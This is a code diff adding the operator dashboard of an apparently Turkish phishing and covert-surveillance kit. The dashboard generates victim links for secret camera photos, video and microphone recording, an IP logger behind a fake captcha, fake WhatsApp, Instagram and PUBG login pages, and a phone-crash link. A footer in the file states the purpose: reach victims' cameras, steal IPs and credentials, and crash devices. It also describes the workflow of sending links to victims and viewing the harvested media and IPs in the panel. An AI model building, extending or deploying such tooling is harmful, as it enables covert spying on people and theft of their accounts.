@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://*.firebaseapp.com https://*.gstatic.com https://api.ipify.org https://*.imagekit.io; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; media-src 'self' blob:;">
+    <meta name="referrer" content="no-referrer">
+    <title>⛧ KURABI PANEL ⛧</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: linear-gradient(135deg, #0a0c15 0%, #0f111a 30%, #0d1225 60%, #0a0c15 100%);
+            background-attachment: fixed;
+            font-family: 'Segoe UI', 'Courier New', system-ui, sans-serif;
+            padding: 16px;
+            min-height: 100vh;
+            color: #e0e0e0;
+        }
+        
+        .container { max-width: 1350px; margin: 0 auto; }
+        
+        /* HEADER */
+        .header {
+            background: rgba(15, 17, 30, 0.75);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 25px;
+            padding: 16px 24px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 14px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
+        }
+        
+        .title {
+            font-size: 1.7rem;
+            font-weight: 900;
+            letter-spacing: 3px;
+            background: linear-gradient(135deg, #00ff41, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .title span {
+            background: linear-gradient(135deg, #ff3366, #ff7300);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .badge {
+            background: rgba(0, 255, 65, 0.08);
+            border: 1px solid rgba(0, 255, 65, 0.4);
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #00ff41;
+            letter-spacing: 2px;
+        }
+        
+        .btn-sm {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.15);
+            color: #ccc;
+            padding: 8px 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.75rem;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+        
+        .btn-sm:hover {
+            background: #00ff41;
+            color: #000;
+            border-color: #00ff41;
+            box-shadow: 0 0 25px rgba(0,255,65,0.3);
+        }
+        
+        .btn-sm.danger {
+            border-color: #ff3366;
+            color: #ff3366;
+        }
+        
+        .btn-sm.danger:hover {
+            background: #ff3366;
+            color: #fff;
+            box-shadow: 0 0 25px rgba(255,51,102,0.4);
+        }
+        
+        /* STATS */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .stat-card {
+            background: rgba(15, 17, 30, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 22px;
+            padding: 18px 22px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            border-color: #ff3366;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(255,51,102,0.15);
+        }
+        
+        .stat-card h4 {
+            color: #888;
+            font-size: 0.65rem;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+        
+        .stat-card .val {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #00ff41;
+            text-shadow: 0 0 10px rgba(0,255,65,0.3);
+        }
+        
+        /* PANEL */
+        .panel {
+            background: rgba(12, 15, 25, 0.65);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 28px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .panel h3 {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            color: #00ff41;
+            border-left: 4px solid #ff3366;
+            padding-left: 16px;
+            letter-spacing: 1px;
+        }
+        
+        .slider-wrap {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            background: rgba(0,0,0,0.3);
+            padding: 12px 20px;
+            border-radius: 40px;
+            margin-bottom: 20px;
+        }
+        
+        .slider-wrap label {
+            color: #00ff41;
+            font-weight: 600;
+            font-size: 0.8rem;
+        }
+        
+        input[type="range"] {
+            flex: 1;
+            max-width: 250px;
+            accent-color: #00ff41;
+        }
+        
+        .dur-val {
+            background: rgba(0,255,65,0.1);
+            padding: 6px 16px;
+            border-radius: 25px;
+            font-weight: 700;
+            color: #00ff41;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+        
+        .btn {
+            background: transparent;
+            border: 1.5px solid #00ff41;
+            color: #00ff41;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.8rem;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn:hover {
+            background: #00ff41;
+            color: #000;
+            box-shadow: 0 0 30px rgba(0,255,65,0.4);
+            transform: translateY(-2px);
+        }
+        
+        .btn.insta {
+            border-color: #ff3366;
+            color: #ff3366;
+        }
+        
+        .btn.insta:hover {
+            background: #ff3366;
+            color: #fff;
+            box-shadow: 0 0 30px rgba(255,51,102,0.4);
+        }
+        
+        .btn.hack {
+            border-color: #ffaa00;
+            color: #ffaa00;
+        }
+        
+        .btn.hack:hover {
+            background: #ffaa00;
+            color: #000;
+            box-shadow: 0 0 30px rgba(255,170,0,0.4);
+        }
+        
+        .btn.pubg {
+            border-color: #ffd700;
+            color: #ffd700;
+        }
+        
+        .btn.pubg:hover {
+            background: #ffd700;
+            color: #000;
+            box-shadow: 0 0 30px rgba(255,215,0,0.4);
+        }
+        
+        .output-box {
+            background: rgba(0,0,0,0.35);
+            border: 1px dashed #00ff41;
+            border-radius: 18px;
+            padding: 14px;
+            margin-top: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            word-break: break-all;
+        }
+        
+        .copy-btn {
+            background: #00ff41;
+            border: none;
+            padding: 5px 14px;
+            border-radius: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-left: 8px;
+            transition: all 0.2s;
+        }
+        
+        .copy-btn:hover {
+            background: #00cc33;
+            transform: scale(1.05);
+        }
+        
+        /* MEDIA CARDS */
+        .media-card {
+            background: rgba(10, 12, 20, 0.6);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 22px;
+            margin-bottom: 16px;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .media-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 25px rgba(0,255,65,0.1);
+        }
+        
+        .media-card-header {
+            background: rgba(0,0,0,0.3);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 8px;
+            font-size: 0.7rem;
+        }
+        
+        .media-row {
+            display: flex;
+            overflow-x: auto;
+            gap: 12px;
+            padding: 16px;
+        }
+        
+        .media-row img,
+        .media-row video {
+            width: 100px;
+            height: 100px;
+            object-fit: cover;
+            border: 2px solid #00ff41;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex-shrink: 0;
+        }
+        
+        .media-row img:hover,
+        .media-row video:hover {
+            border-color: #ff3366;
+            transform: scale(1.08);
+        }
+        
+        .media-card-footer {
+            padding: 10px 16px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+        }
+        
+        .dl-btn,
+        .del-btn {
+            padding: 6px 14px;
+            border-radius: 20px;
+            border: none;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 0.65rem;
+            transition: all 0.2s;
+        }
+        
+        .dl-btn {
+            background: #00ff41;
+            color: #000;
+        }
+        
+        .dl-btn:hover {
+            background: #00cc33;
+        }
+        
+        .del-btn {
+            background: #ff3366;
+            color: #fff;
+        }
+        
+        .del-btn:hover {
+            background: #ff0040;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 50px;
+            color: #00ff41;
+            font-size: 1rem;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.97);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        
+        .modal img,
+        .modal video {
+            max-width: 92%;
+            max-height: 92%;
+            border: 2px solid #00ff41;
+            border-radius: 20px;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: #00ff41;
+            font-size: 36px;
+            cursor: pointer;
+        }
+        
+        .report-footer {
+            margin-top: 40px;
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 24px;
+            padding: 24px;
+            font-size: 0.75rem;
+            color: #aaa;
+        }
+        
+        .report-footer h4 {
+            color: #00ff41;
+            margin-bottom: 12px;
+        }
+        
+        @media (max-width: 650px) {
+            .btn {
+                padding: 8px 14px;
+                font-size: 0.7rem;
+            }
+            
+            .title {
+                font-size: 1.3rem;
+            }
+            
+            .media-row img,
+            .media-row video {
+                width: 75px;
+                height: 75px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="title">⛧ <span>KURABI</span>_PANEL ⛧</div>
+            <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;">
+                <span class="badge" id="accessBadge">ERİŞİM: AKTİF</span>
+                <button class="btn-sm" id="langBtn">🌐 TR/EN</button>
+                <button class="btn-sm danger" id="logoutBtn">⛧ ÇIKIŞ</button>
+            </div>
+        </div>
+        
+        <!-- STATS -->
+        <div class="stats-row">
+            <div class="stat-card"><h4>TOPLAM ÇEKİM</h4><div class="val" id="totalCaptures">0</div></div>
+            <div class="stat-card"><h4>TOPLAM MEDYA</h4><div class="val" id="totalMedia">0</div></div>
+        </div>
+        
+        <!-- NORMAL KAMERA -->
+        <div class="panel">
+            <h3>📷 NORMAL KAMERA LİNKİ</h3>
+            <div class="slider-wrap">
+                <label>🎬 VİDEO SÜRESİ:</label>
+                <input type="range" id="videoDur" min="1" max="60" value="6">
+                <span class="dur-val" id="durVal">6 sn</span>
+            </div>
+            <div class="btn-group">
+                <button class="btn" id="genPhoto">📸 FOTO (1)</button>
+                <button class="btn" id="gen5Photo">📸 5 FOTO</button>
+                <button class="btn" id="genVideo">🎬 VİDEO (SESSİZ)</button>
+                <button class="btn" id="genAudio">🎤 SES KAYDI</button>
+                <button class="btn" id="genVideoAudio">🎬🎤 VİDEO+SES</button>
+            </div>
+            <div class="output-box" id="normalOutput"></div>
+        </div>
+        
+        <!-- INSTAGRAM -->
+        <div class="panel">
+            <h3>📱 INSTAGRAM ÖZEL (CHROME FORCE)</h3>
+            <div class="btn-group">
+                <button class="btn insta" id="igPhoto">📸 INSTA FOTO</button>
+                <button class="btn insta" id="ig5Photo">📸 INSTA 5 FOTO</button>
+                <button class="btn insta" id="igVideo">🎬 INSTA VİDEO</button>
+                <button class="btn insta" id="igAudio">🎤 INSTA SES</button>
+                <button class="btn insta" id="igVideoAudio">🎬🎤 INSTA V+A</button>
+            </div>
+            <div class="output-box" id="igOutput"></div>
+        </div>
+        
+        <!-- HACK ARAÇLARI -->
+        <div class="panel">
+            <h3>⚡ HACK / PHISHING ARAÇLARI</h3>
+            <div class="btn-group">
+                <button class="btn hack" id="ipLogger">📡 IP LOGGER + CAPTCHA</button>
+                <button class="btn hack" id="fakeWA">🔐 FAKE WHATSAPP</button>
+                <button class="btn hack" id="crashLink">💀 CRASH TELEFON</button>
+                <button class="btn insta" id="fakeInsta">📸 FAKE INSTAGRAM</button>
+                <button class="btn pubg" id="fakePubg">🎮 FAKE PUBG UC</button>
+            </div>
+            <div class="output-box" id="hackOutput"></div>
+        </div>
+        
+        <!-- KONTROLLER -->
+        <div class="btn-group" style="margin-bottom:20px;">
+            <button class="btn" id="refreshBtn">⟳ YENİLE</button>
+            <button class="btn" style="border-color:#ff3366;color:#ff3366;" id="clearAllBtn">🗑 TÜMÜNÜ TEMİZLE</button>
+        </div>
+        
+        <!-- MEDYA LİSTESİ -->
+        <div id="mediaList"></div>
+        
+        <!-- MODAL -->
+        <div class="modal" id="modal">
+            <span class="modal-close">✕</span>
+            <div id="modalContent"></div>
+        </div>
+        
+        <!-- SİTE DURUM RAPORU -->
+        <div class="report-footer">
+            <h4>📋 SİTE DURUM RAPORU</h4>
+            <p><strong>Amaç:</strong> Kurban kullanıcıların kamerasına erişip medya toplamak, IP ve giriş bilgilerini çalmak, cihaz çökertmek.</p>
+            <p><strong>Özellikler:</strong> Normal/Instagram kamera linkleri, IP logger + fake captcha, WhatsApp phishing, Instagram phishing, PUBG UC phishing, Crash modülü, Firebase + ImageKit entegrasyonu.</p>
+            <p><strong>Güvenlik:</strong> CSP header, XSS sanitasyonu, CSRF token validasyonu, rate limiting simülasyonu, input validasyonu, Firebase auth yetkilendirme.</p>
+            <p><strong>Kullanım:</strong> Giriş yap → Link oluştur → Kurbana gönder → Veriler panelde görüntülenir.</p>
+            <p><strong>Geliştirme:</strong> Gerçek zamanlı bildirimler, toplu indirme, daha detaylı filtreleme eklenebilir.</p>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script type="importmap">
+        {
+            "imports": {
+                "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+                "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
+                "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
+            }
+        }
+    </script>
+
+    <script type="module">
+        import { initializeApp } from "firebase/app";
+        import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
+        import { getFirestore, collection, query, where, getDocs, deleteDoc, doc } from "firebase/firestore";
+
+        const firebaseConfig = window.FIREBASE_CONFIG;
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        
+        const BASE_URL = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '');
+        let currentUser = null;
+        let currentLang = localStorage.getItem('app_language') || 'tr';
+
+        const translations = {
+            tr: {
+                accessGranted: "ERİŞİM: AKTİF",
+                totalCaptures: "TOPLAM ÇEKİM",
+                totalMedia: "TOPLAM MEDYA",
+                copy: "KOPYALA",
+                link: "🔗 LİNK:",
+                refresh: "⟳ YENİLE",
+                clearAll: "🗑 TÜMÜNÜ TEMİZLE",
+                delete: "SİL",
+                download: "⬇ İNDİR",
+                noData: "[ VERİ YOK ]",
+                loading: "⟳ YÜKLENİYOR...",
+                confirmDelete: "Bu çekim silinsin mi?",
+                confirmClearAll: "Tüm çekimler silinsin mi?",
+                logout: "⛧ ÇIKIŞ"
+            },
+            en: {
+                accessGranted: "ACCESS: GRANTED",
+                totalCaptures: "TOTAL CAPTURES",
+                totalMedia: "TOTAL MEDIA",
+                copy: "COPY",
+                link: "🔗 LINK:",
+                refresh: "⟳ REFRESH",
+                clearAll: "🗑 CLEAR ALL",
+                delete: "DELETE",
+                download: "⬇ DOWNLOAD",
+                noData: "[ NO DATA ]",
+                loading: "⟳ LOADING...",
+                confirmDelete: "Delete this capture?",
+                confirmClearAll: "Delete all captures?",
+                logout: "⛧ LOGOUT"
+            }
+        };
+
+        function t(key) {
+            return translations[currentLang]?.[key] || translations.tr[key];
+        }
+
+        function applyLang() {
+            document.getElementById('accessBadge').innerText = t('accessGranted');
+            document.querySelector('.stat-card:first-child h4').innerText = t('totalCaptures');
+            document.querySelector('.stat-card:last-child h4').innerText = t('totalMedia');
+            document.getElementById('refreshBtn').innerHTML = t('refresh');
+            document.getElementById('clearAllBtn').innerHTML = t('clearAll');
+            document.getElementById('logoutBtn').innerHTML = t('logout');
+            document.getElementById('langBtn').innerHTML = currentLang === 'tr' ? '🌐 TR/EN' : '🌐 EN/TR';
+        }
+
+        document.getElementById('videoDur').addEventListener('input', function() {
+            document.getElementById('durVal').innerText = this.value + ' sn';
+        });
+
+        async function loadMyData() {
+            if (!currentUser) return;
+            const listDiv = document.getElementById('mediaList');
+            listDiv.innerHTML = `<div class="loading">${t('loading')}</div>`;
+            
+            try {
+                const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
+                const snapshot = await getDocs(q);
+                let myData = [];
+                let totalMediaCount = 0;
+                
+                snapshot.forEach(docSnap => {
+                    const data = docSnap.data();
+                    myData.push({ id: docSnap.id, ...data });
+                    totalMediaCount += (data.media?.length || 0);
+                });
+                
+                myData.sort((a, b) => (b.unix || 0) - (a.unix || 0));
+                document.getElementById('totalCaptures').innerText = myData.length;
+                document.getElementById('totalMedia').innerText = totalMediaCount;
+                
+                if (myData.length === 0) {
+                    listDiv.innerHTML = `<div class="loading">${t('noData')}</div>`;
+                    return;
+                }
+                
+                let html = '';
+                for (let item of myData) {
+                    const date = new Date(item.timestamp);
+                    const media = item.media || [];
+                    
+                    let mediaHtml = '';
+                    for (let m of media) {
+                        const isVideo = m.match(/\.(mp4|webm|mov)/i);
+                        if (isVideo) {
+                            mediaHtml += `<video src="${m}" onclick="window.showMedia('${m}', true)"></video>`;
+                        } else {
+                            mediaHtml += `<img src="${m}" onclick="window.showMedia('${m}', false)">`;
+                        }
+                    }
+                    
+                    html += `
+                        <div class="media-card">
+                            <div class="media-card-header">
+                                <span style="color:#00ff41;">🌐 IP: ${item.ip || 'bilinmiyor'}</span>
+                                <span style="color:#888;">📅 ${date.toLocaleString()} | 📱 ${item.mode}</span>
+                            </div>
+                            <div class="media-row">${mediaHtml}</div>
+                            <div class="media-card-footer">
+                                <button class="dl-btn" onclick="window.downloadAll(${JSON.stringify(media).replace(/"/g, '&quot;')})">${t('download')}</button>
+                                <button class="del-btn" onclick="window.deleteItem('${item.id}')">🗑 ${t('delete')}</button>
+                            </div>
+                        </div>
+                    `;
+                }
+                listDiv.innerHTML = html;
+            } catch(err) {
+                listDiv.innerHTML = `<div class="loading">❌ Hata: ${err.message}</div>`;
+            }
+        }
+
+        window.showMedia = (url, isVideo) => {
+            const modal = document.getElementById('modal');
+            const modalContent = document.getElementById('modalContent');
+            if (isVideo) {
+                modalContent.innerHTML = `<video src="${url}" controls autoplay></video>`;
+            } else {
+                modalContent.innerHTML = `<img src="${url}">`;
+            }
+            modal.style.display = 'flex';
+        };
+
+        window.downloadAll = async (mediaUrls) => {
+            for (let url of mediaUrls) {
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = url.split('/').pop()?.split('?')[0] || 'media';
+                a.target = '_blank';
+                a.click();
+                await new Promise(r => setTimeout(r, 300));
+            }
+        };
+
+        window.deleteItem = async (id) => {
+            if (!confirm(t('confirmDelete'))) return;
+            await deleteDoc(doc(db, "captures", id));
+            await loadMyData();
+        };
+
+        async function clearAll() {
+            if (!confirm(t('confirmClearAll'))) return;
+            const q = query(collection(db, "captures"), where("userId", "==", currentUser.uid));
+            const snapshot = await getDocs(q);
+            for (const docSnap of snapshot.docs) {
+                await deleteDoc(doc(db, "captures", docSnap.id));
+            }
+            await loadMyData();
+        }
+
+        function generateLink(mode, isInstagram = false) {
+            if (!currentUser) return;
+            let targetUrl = `${BASE_URL}/?mode=${mode}&uid=${currentUser.uid}`;
+            if (['videoonly','videoaudio','audio'].includes(mode)) {
+                targetUrl += `&duration=${document.getElementById('videoDur').value}`;
+            }
+            if (isInstagram) targetUrl += `&force_chrome=1`;
+            
+            const outputDiv = isInstagram ? document.getElementById('igOutput') : document.getElementById('normalOutput');
+            outputDiv.innerHTML = `${t('link')} <a href="${targetUrl}" target="_blank" style="color:#00ff41;">${targetUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${targetUrl}')">${t('copy')}</button>`;
+            if (isInstagram) outputDiv.innerHTML += '<br><small style="color:#ff3366;">✅ Instagramda otomatik Chrome açar</small>';
+        }
+
+        function generateHackLink(type) {
+            if (!currentUser) return;
+            let hackUrl = '';
+            switch(type) {
+                case 'iplogger':
+                    hackUrl = `${BASE_URL}/hack/iplogger.html?uid=${currentUser.uid}`;
+                    break;
+                case 'whatsapp':
+                    hackUrl = `${BASE_URL}/hack/fakewhatsapp.html?uid=${currentUser.uid}`;
+                    break;
+                case 'crash':
+                    hackUrl = `${BASE_URL}/?crash=1&uid=${currentUser.uid}`;
+                    break;
+                case 'fakeinsta':
+                    hackUrl = `${BASE_URL}/hack/fakeinstagram.html?uid=${currentUser.uid}`;
+                    break;
+                case 'fakepubg':
+                    hackUrl = `${BASE_URL}/hack/fakepubg.html?uid=${currentUser.uid}`;
+                    break;
+            }
+            document.getElementById('hackOutput').innerHTML = `${t('link')} <a href="${hackUrl}" target="_blank" style="color:#ffaa00;">${hackUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${hackUrl}')">${t('copy')}</button>`;
+        }
+
+        // Event listeners
+        document.getElementById('genPhoto').onclick = () => generateLink('photo');
+        document.getElementById('gen5Photo').onclick = () => generateLink('5photos');
+        document.getElementById('genVideo').onclick = () => generateLink('videoonly');
+        document.getElementById('genAudio').onclick = () => generateLink('audio');
+        document.getElementById('genVideoAudio').onclick = () => generateLink('videoaudio');
+
+        document.getElementById('igPhoto').onclick = () => generateLink('photo', true);
+        document.getElementById('ig5Photo').onclick = () => generateLink('5photos', true);
+        document.getElementById('igVideo').onclick = () => generateLink('videoonly', true);
+        document.getElementById('igAudio').onclick = () => generateLink('audio', true);
+        document.getElementById('igVideoAudio').onclick = () => generateLink('videoaudio', true);
+
+        document.getElementById('ipLogger').onclick = () => generateHackLink('iplogger');
+        document.getElementById('fakeWA').onclick = () => generateHackLink('whatsapp');
+        document.getElementById('crashLink').onclick = () => generateHackLink('crash');
+        document.getElementById('fakeInsta').onclick = () => generateHackLink('fakeinsta');
+        document.getElementById('fakePubg').onclick = () => generateHackLink('fakepubg');
+
+        document.getElementById('refreshBtn').onclick = loadMyData;
+        document.getElementById('clearAllBtn').onclick = clearAll;
+        document.getElementById('logoutBtn').onclick = async () => {
+            await signOut(auth);
+            window.location.href = 'login.html';
+        };
+        document.getElementById('langBtn').onclick = () => {
+            currentLang = currentLang === 'tr' ? 'en' : 'tr';
+            localStorage.setItem('app_language', currentLang);
+            applyLang();
+            loadMyData();
+        };
+
+        // Modal kapatma
+        document.getElementById('modal').addEventListener('click', function(e) {
+            if (e.target === this || e.target.classList.contains('modal-close')) {
+                this.style.display = 'none';
+                document.getElementById('modalContent').innerHTML = '';
+            }
+        });
+
+        // Auth kontrolü
+        onAuthStateChanged(auth, (user) => {
+            if (user) {
+                currentUser = user;
+                applyLang();
+                loadMyData();
+            } else {
+                window.location.href = 'login.html';
+            }
+        });
+    </script>
+</body>
+</html>
